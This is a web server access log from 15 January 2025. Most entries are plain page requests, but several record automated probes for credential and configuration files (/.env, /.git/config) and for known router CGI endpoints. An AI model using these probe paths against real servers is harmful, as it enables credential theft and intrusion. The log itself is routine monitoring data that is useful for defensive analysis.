78.153.140.149 - - [15/Jan/2025:18:50:06 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.43.33.210 - - [15/Jan/2025:19:29:41 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
78.153.140.149 - - [15/Jan/2025:19:50:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:19:50:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [15/Jan/2025:19:52:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.13.224.222 - - [15/Jan/2025:19:58:21 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3"
179.43.191.146 - - [15/Jan/2025:20:58:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.120.115.119 - - [15/Jan/2025:21:01:01 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0"
95.214.55.226 - - [15/Jan/2025:21:01:57 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
115.162.137.203 - - [15/Jan/2025:21:19:06 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.149 - - [15/Jan/2025:21:28:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:21:28:40 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.242.226.10 - - [15/Jan/2025:21:41:49 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
47.237.115.100 - - [15/Jan/2025:21:56:07 +0000] "\x16\x03\x01" 400 526 "-" "-"
5.181.190.248 - - [15/Jan/2025:22:25:26 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:22:25:26 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
95.214.53.198 - - [15/Jan/2025:22:30:30 +0000] "GET /cgi-bin/getwifiattr.cgi HTTP/1.1" 302 350 "-" "Linux Gnu (cow)"
78.153.140.149 - - [15/Jan/2025:22:49:56 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:22:49:57 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
35.205.56.72 - - [15/Jan/2025:23:26:26 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
